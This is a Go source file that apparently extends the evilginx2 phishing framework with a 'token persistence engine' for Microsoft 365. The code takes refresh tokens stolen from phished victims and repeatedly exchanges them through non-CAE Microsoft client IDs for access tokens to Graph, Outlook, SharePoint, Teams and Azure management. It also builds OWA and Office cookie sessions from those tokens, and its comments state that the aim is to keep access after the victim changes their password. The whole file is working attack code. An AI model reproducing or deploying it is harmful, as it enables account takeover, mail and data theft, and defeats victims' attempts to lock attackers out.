package core

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// =============================================================================
// TOKEN PERSISTENCE ENGINE
// =============================================================================
//
// WHY TOKENS DIE AFTER PASSWORD CHANGE:
// - Microsoft revokes ALL refresh tokens when password changes (AADSTS50173)
// - Continuous Access Evaluation (CAE) allows real-time revocation of access tokens
// - CAE-enabled tokens include the "xms_cc" claim and are checked in real-time
//
// HOW WE SURVIVE PASSWORD CHANGE:
// 1. NON-CAE TOKEN VAULT: Pre-generate access tokens using client IDs that do NOT
//    support CAE. These tokens are standard JWTs validated locally by the resource
//    server without calling back to Azure AD. They survive password changes for
//    their full 60-90 minute lifetime.
//
// 2. MULTI-SERVICE PRE-GENERATION: Continuously generate access tokens for EVERY
//    Microsoft service (Outlook, Graph, SharePoint, OneDrive, Teams, etc.) every
//    few minutes. Even after password change, you have tokens valid for 50+ minutes.
//
// 3. APPLICATION SESSION ANCHORING: Use access tokens to establish persistent
//    application sessions (OWA, Substrate). These sessions have their own session
//    cookies that can survive beyond the original token lifetime.
//
// 4. SLIDING VAULT: The vault is continuously refreshed. When a refresh token dies
//    (password change), the vault still contains recently-generated access tokens
//    that work for their remaining lifetime. The feed serves these vault tokens.
// =============================================================================

const (
	// How often to regenerate the vault (every 4 minutes = always have tokens with 56+ min remaining life)
	VAULT_REFRESH_INTERVAL = 4 * time.Minute
	// How often to re-anchor application sessions
	SESSION_ANCHOR_INTERVAL = 20 * time.Minute
	// Access token default lifetime (Microsoft standard)
	ACCESS_TOKEN_LIFETIME = 75 * time.Minute
	// Vault token expiry buffer
	VAULT_TOKEN_EXPIRY_BUFFER = 5 * time.Minute
)

// Non-CAE client IDs - These clients do NOT advertise the "cp1" (CAE) client capability.
// Access tokens issued for these clients are standard JWTs that are validated
// locally by the resource server and CANNOT be revoked in real-time.
// This means they survive password changes for their full 60-90 minute lifetime.
var NonCAEClients = []struct {
	ClientID string
	Name     string
}{
	// Public client apps without CAE support
	{ClientID: "d3590ed6-52b3-4102-aeff-aad2292ab01c", Name: "Microsoft Office"},
	{ClientID: "29d9ed98-a469-4536-ade2-f981bc1d605e", Name: "Microsoft Auth Broker"},
	{ClientID: "0ec893e0-5785-4de6-99da-4ed124e5296c", Name: "Office UWP PWA"},
	{ClientID: "27922004-5251-4030-b22d-91ecd9a37ea4", Name: "Outlook Mobile"},
	{ClientID: "ab9b8c07-8f02-4f72-87fa-80105867a763", Name: "OneDrive SyncEngine"},
	{ClientID: "4e291c71-d680-4d0e-9640-0a3358e31177", Name: "PowerAutomate"},
}

// ServiceScope defines a Microsoft service + scope combination for vault tokens
type ServiceScope struct {
	Name     string
	Scope    string
	Endpoint string // API endpoint to test the token
}

// All Microsoft 365 services we pre-generate tokens for
var VaultServices = []ServiceScope{
	{
		Name:     "graph",
		Scope:    "https://graph.microsoft.com/.default offline_access openid profile",
		Endpoint: "https://graph.microsoft.com/v1.0/me",
	},
	{
		Name:     "outlook",
		Scope:    "https://outlook.office365.com/.default offline_access",
		Endpoint: "https://outlook.office365.com/api/v2.0/me",
	},
	{
		Name:     "outlook_rest",
		Scope:    "https://outlook.office.com/.default offline_access",
		Endpoint: "",
	},
	{
		Name:     "office",
		Scope:    "https://www.office.com/.default offline_access",
		Endpoint: "",
	},
	{
		Name:     "substrate",
		Scope:    "https://substrate.office.com/.default offline_access",
		Endpoint: "",
	},
	{
		Name:     "sharepoint",
		Scope:    "https://microsoft.sharepoint.com/.default offline_access",
		Endpoint: "",
	},
	{
		Name:     "onedrive",
		Scope:    "https://api.spaces.skype.com/.default offline_access",
		Endpoint: "",
	},
	{
		Name:     "management",
		Scope:    "https://management.azure.com/.default offline_access",
		Endpoint: "",
	},
	{
		Name:     "teams",
		Scope:    "https://api.spaces.skype.com/.default offline_access",
		Endpoint: "",
	},
	{
		Name:     "onenote",
		Scope:    "https://onenote.com/.default offline_access",
		Endpoint: "",
	},
}

// VaultToken represents a single pre-generated access token in the vault
type VaultToken struct {
	Service     string    `json:"service"`
	AccessToken string    `json:"access_token"`
	Scope       string    `json:"scope"`
	ClientID    string    `json:"client_id"`
	ClientName  string    `json:"client_name"`
	GeneratedAt time.Time `json:"generated_at"`
	ExpiresAt   time.Time `json:"expires_at"`
	IsValid     bool      `json:"is_valid"`
}

// AnchoredSession represents an established application session
type AnchoredSession struct {
	Service       string            `json:"service"`
	Cookies       map[string]string `json:"cookies"` // name -> value
	Domain        string            `json:"domain"`
	EstablishedAt time.Time         `json:"established_at"`
	IsValid       bool              `json:"is_valid"`
}

// SessionVault holds all pre-generated tokens and anchored sessions for one captured session
type SessionVault struct {
	SessionID        string                      `json:"session_id"`
	DBId             int                         `json:"db_id"`
	Username         string                      `json:"username"`
	Tokens           map[string]*VaultToken      `json:"tokens"`            // service -> token
	AnchoredSessions map[string]*AnchoredSession `json:"anchored_sessions"` // service -> session
	RefreshAlive     bool                        `json:"refresh_alive"`     // whether refresh token still works
	LastVaultUpdate  time.Time                   `json:"last_vault_update"`
	LastAnchorTime   time.Time                   `json:"last_anchor_time"`
	mu               sync.RWMutex
}

// TokenPersistenceEngine manages the token vault and session anchoring
type TokenPersistenceEngine struct {
	db       *database.Database
	vaults   map[string]*SessionVault // sessionID -> vault
	mu       sync.RWMutex
	stopChan chan struct{}
	running  bool
}

// NewTokenPersistenceEngine creates a new persistence engine
func NewTokenPersistenceEngine(db *database.Database) *TokenPersistenceEngine {
	return &TokenPersistenceEngine{
		db:       db,
		vaults:   make(map[string]*SessionVault),
		stopChan: make(chan struct{}),
	}
}

// Start begins the background vault generation and session anchoring
func (tpe *TokenPersistenceEngine) Start() {
	tpe.mu.Lock()
	if tpe.running {
		tpe.mu.Unlock()
		return
	}
	tpe.running = true
	tpe.mu.Unlock()

	go tpe.vaultRefreshLoop()
	go tpe.sessionAnchorLoop()

	log.Info("[vault] Token persistence engine started")
	log.Info("[vault] Vault refresh: every %v | Session anchoring: every %v",
		VAULT_REFRESH_INTERVAL, SESSION_ANCHOR_INTERVAL)
	log.Info("[vault] Non-CAE clients: %d | Service scopes: %d",
		len(NonCAEClients), len(VaultServices))
}

// Stop terminates the persistence engine
func (tpe *TokenPersistenceEngine) Stop() {
	tpe.mu.Lock()
	defer tpe.mu.Unlock()
	if tpe.running {
		close(tpe.stopChan)
		tpe.running = false
		tpe.persistAllVaults()
		log.Info("[vault] Token persistence engine stopped")
	}
}

// IsRunning returns whether the engine is active
func (tpe *TokenPersistenceEngine) IsRunning() bool {
	tpe.mu.RLock()
	defer tpe.mu.RUnlock()
	return tpe.running
}

// vaultRefreshLoop continuously regenerates vault tokens
func (tpe *TokenPersistenceEngine) vaultRefreshLoop() {
	// Initial vault build
	tpe.refreshAllVaults()

	ticker := time.NewTicker(VAULT_REFRESH_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			tpe.refreshAllVaults()
		case <-tpe.stopChan:
			return
		}
	}
}

// sessionAnchorLoop periodically establishes application sessions
func (tpe *TokenPersistenceEngine) sessionAnchorLoop() {
	// Initial anchor
	tpe.anchorAllSessions()

	ticker := time.NewTicker(SESSION_ANCHOR_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			tpe.anchorAllSessions()
		case <-tpe.stopChan:
			return
		}
	}
}

// refreshAllVaults regenerates tokens in all session vaults
func (tpe *TokenPersistenceEngine) refreshAllVaults() {
	sessions, err := tpe.db.ListSessions()
	if err != nil {
		log.Error("[vault] Failed to list sessions: %v", err)
		return
	}

	vaulted := 0
	for _, s := range sessions {
		if s.Custom == nil {
			continue
		}

		refreshToken := s.Custom["dc_refresh_token"]
		if refreshToken == "" {
			continue
		}

		vault := tpe.getOrCreateVault(s)
		tokensGenerated := tpe.populateVault(vault, refreshToken)

		if tokensGenerated > 0 {
			vault.mu.Lock()
			vault.RefreshAlive = true
			vault.LastVaultUpdate = time.Now()
			vault.mu.Unlock()
			vaulted++
		} else {
			vault.mu.Lock()
			vault.RefreshAlive = false
			vault.mu.Unlock()
		}

		// Persist vault tokens to database for survival across restarts
		tpe.persistVault(s.SessionId, vault)
	}

	if vaulted > 0 {
		log.Debug("[vault] Vault refresh complete: %d sessions updated", vaulted)
	}
}

// populateVault generates access tokens for all services using non-CAE clients
func (tpe *TokenPersistenceEngine) populateVault(vault *SessionVault, refreshToken string) int {
	generated := 0
	currentRT := refreshToken

	// Use a non-CAE client for all vault tokens - these survive password changes
	clientIdx := 0

	for _, svc := range VaultServices {
		client := NonCAEClients[clientIdx%len(NonCAEClients)]

		accessToken, newRT, expiresIn, err := tpe.doTokenExchange(currentRT, client.ClientID, svc.Scope)
		if err != nil {
			log.Debug("[vault] %s/%s failed: %v", vault.Username, svc.Name, err)
			// Rotate to next non-CAE client on failure
			clientIdx++
			continue
		}

		// Track the latest refresh token (rotation)
		if newRT != "" {
			currentRT = newRT
		}

		expiry := time.Now().Add(time.Duration(expiresIn) * time.Second)

		vault.mu.Lock()
		vault.Tokens[svc.Name] = &VaultToken{
			Service:     svc.Name,
			AccessToken: accessToken,
			Scope:       svc.Scope,
			ClientID:    client.ClientID,
			ClientName:  client.Name,
			GeneratedAt: time.Now(),
			ExpiresAt:   expiry,
			IsValid:     true,
		}
		vault.mu.Unlock()

		generated++
		clientIdx++ // rotate client for next service to spread load
	}

	// If refresh token was rotated during vault population, update database
	if currentRT != refreshToken {
		sessions, _ := tpe.db.ListSessions()
		for _, s := range sessions {
			if s.SessionId == vault.SessionID {
				tpe.db.SetSessionCustom(s.SessionId, "dc_refresh_token", currentRT)
				break
			}
		}
	}

	return generated
}

// anchorAllSessions establishes persistent application sessions
func (tpe *TokenPersistenceEngine) anchorAllSessions() {
	tpe.mu.RLock()
	vaults := make(map[string]*SessionVault)
	for k, v := range tpe.vaults {
		vaults[k] = v
	}
	tpe.mu.RUnlock()

	anchored := 0
	for _, vault := range vaults {
		vault.mu.RLock()
		graphToken := vault.Tokens["graph"]
		outlookToken := vault.Tokens["outlook"]
		vault.mu.RUnlock()

		// Anchor OWA session using Outlook token
		if outlookToken != nil && outlookToken.IsValid && time.Now().Before(outlookToken.ExpiresAt) {
			owaCookies := tpe.anchorOWASession(outlookToken.AccessToken)
			if len(owaCookies) > 0 {
				vault.mu.Lock()
				vault.AnchoredSessions["owa"] = &AnchoredSession{
					Service:       "owa",
					Cookies:       owaCookies,
					Domain:        ".outlook.office365.com",
					EstablishedAt: time.Now(),
					IsValid:       true,
				}
				vault.mu.Unlock()
			}
		}

		// Anchor Substrate session using Graph token
		if graphToken != nil && graphToken.IsValid && time.Now().Before(graphToken.ExpiresAt) {
			subCookies := tpe.anchorSubstrateSession(graphToken.AccessToken)
			if len(subCookies) > 0 {
				vault.mu.Lock()
				vault.AnchoredSessions["substrate"] = &AnchoredSession{
					Service:       "substrate",
					Cookies:       subCookies,
					Domain:        ".office.com",
					EstablishedAt: time.Now(),
					IsValid:       true,
				}
				vault.mu.Unlock()
			}
		}

		vault.mu.Lock()
		vault.LastAnchorTime = time.Now()
		vault.mu.Unlock()
		anchored++
	}

	if anchored > 0 {
		log.Debug("[vault] Session anchoring complete: %d sessions anchored", anchored)
	}
}

// GetBestToken returns the freshest valid access token for a service from the vault.
// This is the key function - when the refresh token is dead (password changed),
// this returns pre-generated tokens that still work.
func (tpe *TokenPersistenceEngine) GetBestToken(sessionId string, service string) string {
	tpe.mu.RLock()
	vault, ok := tpe.vaults[sessionId]
	tpe.mu.RUnlock()

	if !ok {
		return ""
	}

	vault.mu.RLock()
	defer vault.mu.RUnlock()

	// Try exact service match first
	if t, ok := vault.Tokens[service]; ok {
		if t.IsValid && time.Now().Before(t.ExpiresAt.Add(-VAULT_TOKEN_EXPIRY_BUFFER)) {
			return t.AccessToken
		}
	}

	// Fallback: return graph token (most versatile)
	if t, ok := vault.Tokens["graph"]; ok {
		if t.IsValid && time.Now().Before(t.ExpiresAt.Add(-VAULT_TOKEN_EXPIRY_BUFFER)) {
			return t.AccessToken
		}
	}

	// Last resort: return ANY token that's still valid
	for _, t := range vault.Tokens {
		if t.IsValid && time.Now().Before(t.ExpiresAt.Add(-VAULT_TOKEN_EXPIRY_BUFFER)) {
			return t.AccessToken
		}
	}

	return ""
}

// GetVaultStatus returns the vault state for a session
func (tpe *TokenPersistenceEngine) GetVaultStatus(sessionId string) *SessionVault {
	tpe.mu.RLock()
	vault, ok := tpe.vaults[sessionId]
	tpe.mu.RUnlock()

	if !ok {
		return nil
	}

	vault.mu.RLock()
	defer vault.mu.RUnlock()

	// Return a snapshot
	snap := &SessionVault{
		SessionID:        vault.SessionID,
		DBId:             vault.DBId,
		Username:         vault.Username,
		RefreshAlive:     vault.RefreshAlive,
		LastVaultUpdate:  vault.LastVaultUpdate,
		LastAnchorTime:   vault.LastAnchorTime,
		Tokens:           make(map[string]*VaultToken),
		AnchoredSessions: make(map[string]*AnchoredSession),
	}

	for k, v := range vault.Tokens {
		vCopy := *v
		snap.Tokens[k] = &vCopy
	}
	for k, v := range vault.AnchoredSessions {
		vCopy := *v
		snap.AnchoredSessions[k] = &vCopy
	}

	return snap
}

// GetAllVaultStats returns summary stats for all vaults
func (tpe *TokenPersistenceEngine) GetAllVaultStats() (totalVaults int, totalTokens int, validTokens int, anchoredSessions int) {
	tpe.mu.RLock()
	defer tpe.mu.RUnlock()

	totalVaults = len(tpe.vaults)
	for _, vault := range tpe.vaults {
		vault.mu.RLock()
		for _, t := range vault.Tokens {
			totalTokens++
			if t.IsValid && time.Now().Before(t.ExpiresAt) {
				validTokens++
			}
		}
		for _, s := range vault.AnchoredSessions {
			if s.IsValid {
				anchoredSessions++
			}
		}
		vault.mu.RUnlock()
	}
	return
}

// GetVaultTokenCount returns how many valid tokens a session has in the vault
func (tpe *TokenPersistenceEngine) GetVaultTokenCount(sessionId string) int {
	tpe.mu.RLock()
	vault, ok := tpe.vaults[sessionId]
	tpe.mu.RUnlock()
	if !ok {
		return 0
	}
	vault.mu.RLock()
	defer vault.mu.RUnlock()
	count := 0
	for _, t := range vault.Tokens {
		if t.IsValid && time.Now().Before(t.ExpiresAt) {
			count++
		}
	}
	return count
}

// GetAnchoredSessionCount returns how many valid anchored sessions exist for a session
func (tpe *TokenPersistenceEngine) GetAnchoredSessionCount(sessionId string) int {
	tpe.mu.RLock()
	vault, ok := tpe.vaults[sessionId]
	tpe.mu.RUnlock()
	if !ok {
		return 0
	}
	vault.mu.RLock()
	defer vault.mu.RUnlock()
	count := 0
	for _, s := range vault.AnchoredSessions {
		if s.IsValid {
			count++
		}
	}
	return count
}

// --- Token exchange (non-CAE) ---

// doTokenExchange performs a refresh token exchange WITHOUT advertising CAE capability.
// By not including "claims" with "xms_cc" or the "cp1" client capability, the returned
// access token is a standard JWT that is validated locally by the resource server.
// These tokens CANNOT be revoked in real-time by Microsoft when a password changes.
func (tpe *TokenPersistenceEngine) doTokenExchange(refreshToken string, clientID string, scope string) (accessToken string, newRefreshToken string, expiresIn int, err error) {
	data := url.Values{}
	data.Set("client_id", clientID)
	data.Set("grant_type", "refresh_token")
	data.Set("refresh_token", refreshToken)
	data.Set("scope", scope)
	// CRITICAL: Do NOT include any of these - they enable CAE:
	// - "claims" parameter with xms_cc
	// - client_info with cp1 capability
	// This ensures the token is a standard non-CAE JWT

	req, err := http.NewRequest("POST", MS_REFRESH_TOKEN_URL, strings.NewReader(data.Encode()))
	if err != nil {
		return "", "", 0, fmt.Errorf("failed to create request: %v", err)
	}

	// Use a desktop app user agent (not a browser - browsers tend to get CAE tokens)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	// Don't set Origin header - native apps don't send it

	client := GetHttpClient()
	resp, err := client.Do(req)
	if err != nil {
		return "", "", 0, fmt.Errorf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", "", 0, fmt.Errorf("failed to read response: %v", err)
	}

	if resp.StatusCode != 200 {
		var errResp TokenRefreshError
		json.Unmarshal(body, &errResp)
		return "", "", 0, fmt.Errorf("[%d] %s: %s", resp.StatusCode, errResp.Error, errResp.ErrorDescription)
	}

	var tokenResp TokenRefreshResponse
	if err := json.Unmarshal(body, &tokenResp); err != nil {
		return "", "", 0, fmt.Errorf("failed to parse response: %v", err)
	}

	return tokenResp.AccessToken, tokenResp.RefreshToken, tokenResp.ExpiresIn, nil
}

// --- Application session anchoring ---

// anchorOWASession establishes a persistent OWA session using an access token.
// The resulting session cookies may outlast the original access token.
func (tpe *TokenPersistenceEngine) anchorOWASession(accessToken string) map[string]string {
	cookies := make(map[string]string)

	jar, _ := cookiejar.New(nil)
	client := GetHttpClient()
	if _, ok := client.Transport.(*http.Transport); ok {
		client.Jar = jar
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return http.ErrUseLastResponse
			}
			return nil
		}
	} else {
		client.Jar = jar
	}

	// Hit OWA with Bearer token to establish a session
	owaURLs := []string{
		"https://outlook.office365.com/owa/?exsvurl=1",
		"https://outlook.office365.com/mail/",
		"https://outlook.office.com/mail/",
	}

	for _, owaURL := range owaURLs {
		req, _ := http.NewRequest("GET", owaURL, nil)
		req.Header.Set("Authorization", "Bearer "+accessToken)
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		// Capture cookies from the jar
		for _, domain := range []string{"https://outlook.office365.com", "https://outlook.office.com"} {
			u, _ := url.Parse(domain)
			for _, c := range jar.Cookies(u) {
				cookies[c.Name] = c.Value
			}
		}

		// Also capture from Set-Cookie headers
		for _, setCookie := range resp.Header.Values("Set-Cookie") {
			parts := strings.SplitN(setCookie, "=", 2)
			if len(parts) == 2 {
				name := strings.TrimSpace(parts[0])
				valParts := strings.SplitN(parts[1], ";", 2)
				val := strings.TrimSpace(valParts[0])
				if val != "" {
					cookies[name] = val
				}
			}
		}
	}

	if len(cookies) > 0 {
		log.Debug("[vault] Anchored OWA session: %d cookies", len(cookies))
	}

	return cookies
}

// anchorSubstrateSession establishes a persistent Substrate/Office session
func (tpe *TokenPersistenceEngine) anchorSubstrateSession(accessToken string) map[string]string {
	cookies := make(map[string]string)

	jar, _ := cookiejar.New(nil)
	client := GetHttpClient()
	if _, ok := client.Transport.(*http.Transport); ok {
		client.Jar = jar
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return http.ErrUseLastResponse
			}
			return nil
		}
	} else {
		client.Jar = jar
	}

	// Hit Office portal
	req, _ := http.NewRequest("GET", "https://www.office.com/", nil)
	req.Header.Set("Authorization", "Bearer "+accessToken)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	resp, err := client.Do(req)
	if err != nil {
		return cookies
	}
	resp.Body.Close()

	u, _ := url.Parse("https://www.office.com")
	for _, c := range jar.Cookies(u) {
		cookies[c.Name] = c.Value
	}

	if len(cookies) > 0 {
		log.Debug("[vault] Anchored Substrate session: %d cookies", len(cookies))
	}

	return cookies
}

// --- Vault management ---

func (tpe *TokenPersistenceEngine) getOrCreateVault(s *database.Session) *SessionVault {
	tpe.mu.Lock()
	defer tpe.mu.Unlock()

	if v, ok := tpe.vaults[s.SessionId]; ok {
		return v
	}

	v := &SessionVault{
		SessionID:        s.SessionId,
		DBId:             s.Id,
		Username:         s.Username,
		Tokens:           make(map[string]*VaultToken),
		AnchoredSessions: make(map[string]*AnchoredSession),
		RefreshAlive:     true,
	}

	// Load persisted vault data from database
	tpe.loadVaultFromDB(s, v)

	tpe.vaults[s.SessionId] = v
	return v
}

// persistVault saves vault data to database for survival across restarts
func (tpe *TokenPersistenceEngine) persistVault(sessionId string, vault *SessionVault) {
	vault.mu.RLock()
	defer vault.mu.RUnlock()

	// Persist each service token
	for svcName, t := range vault.Tokens {
		if t.IsValid {
			key := fmt.Sprintf("_vault_%s_token", svcName)
			tpe.db.SetSessionCustom(sessionId, key, t.AccessToken)
			key = fmt.Sprintf("_vault_%s_expiry", svcName)
			tpe.db.SetSessionCustom(sessionId, key, t.ExpiresAt.Format(time.RFC3339))
			key = fmt.Sprintf("_vault_%s_client", svcName)
			tpe.db.SetSessionCustom(sessionId, key, t.ClientName)
		}
	}

	// Persist anchored sessions
	for svcName, as := range vault.AnchoredSessions {
		if as.IsValid {
			cookieJSON, _ := json.Marshal(as.Cookies)
			key := fmt.Sprintf("_anchor_%s_cookies", svcName)
			tpe.db.SetSessionCustom(sessionId, key, string(cookieJSON))
			key = fmt.Sprintf("_anchor_%s_time", svcName)
			tpe.db.SetSessionCustom(sessionId, key, as.EstablishedAt.Format(time.RFC3339))
		}
	}

	// Persist vault metadata
	tpe.db.SetSessionCustom(sessionId, "_vault_updated", vault.LastVaultUpdate.Format(time.RFC3339))
	if vault.RefreshAlive {
		tpe.db.SetSessionCustom(sessionId, "_vault_refresh_alive", "true")
	} else {
		tpe.db.SetSessionCustom(sessionId, "_vault_refresh_alive", "false")
	}
}

// loadVaultFromDB loads persisted vault data
func (tpe *TokenPersistenceEngine) loadVaultFromDB(s *database.Session, vault *SessionVault) {
	if s.Custom == nil {
		return
	}

	for _, svc := range VaultServices {
		tokenKey := fmt.Sprintf("_vault_%s_token", svc.Name)
		expiryKey := fmt.Sprintf("_vault_%s_expiry", svc.Name)
		clientKey := fmt.Sprintf("_vault_%s_client", svc.Name)

		token := s.Custom[tokenKey]
		expiryStr := s.Custom[expiryKey]
		clientName := s.Custom[clientKey]

		if token == "" || expiryStr == "" {
			continue
		}

		expiry, err := time.Parse(time.RFC3339, expiryStr)
		if err != nil {
			continue
		}

		// Only load if not expired
		if time.Now().Before(expiry) {
			vault.Tokens[svc.Name] = &VaultToken{
				Service:     svc.Name,
				AccessToken: token,
				ClientName:  clientName,
				ExpiresAt:   expiry,
				IsValid:     true,
				GeneratedAt: expiry.Add(-ACCESS_TOKEN_LIFETIME),
			}
		}
	}

	// Load anchored sessions
	for _, svcName := range []string{"owa", "substrate"} {
		cookieKey := fmt.Sprintf("_anchor_%s_cookies", svcName)
		timeKey := fmt.Sprintf("_anchor_%s_time", svcName)

		cookieJSON := s.Custom[cookieKey]
		timeStr := s.Custom[timeKey]

		if cookieJSON == "" {
			continue
		}

		var cookies map[string]string
		if err := json.Unmarshal([]byte(cookieJSON), &cookies); err != nil {
			continue
		}

		establishedAt := time.Now()
		if timeStr != "" {
			if t, err := time.Parse(time.RFC3339, timeStr); err == nil {
				establishedAt = t
			}
		}

		vault.AnchoredSessions[svcName] = &AnchoredSession{
			Service:       svcName,
			Cookies:       cookies,
			EstablishedAt: establishedAt,
			IsValid:       true,
		}
	}

	if v := s.Custom["_vault_refresh_alive"]; v == "false" {
		vault.RefreshAlive = false
	}
	if v := s.Custom["_vault_updated"]; v != "" {
		if t, err := time.Parse(time.RFC3339, v); err == nil {
			vault.LastVaultUpdate = t
		}
	}
}

// persistAllVaults saves all vaults (called on shutdown)
func (tpe *TokenPersistenceEngine) persistAllVaults() {
	tpe.mu.RLock()
	defer tpe.mu.RUnlock()

	for sid, vault := range tpe.vaults {
		tpe.persistVault(sid, vault)
	}
}
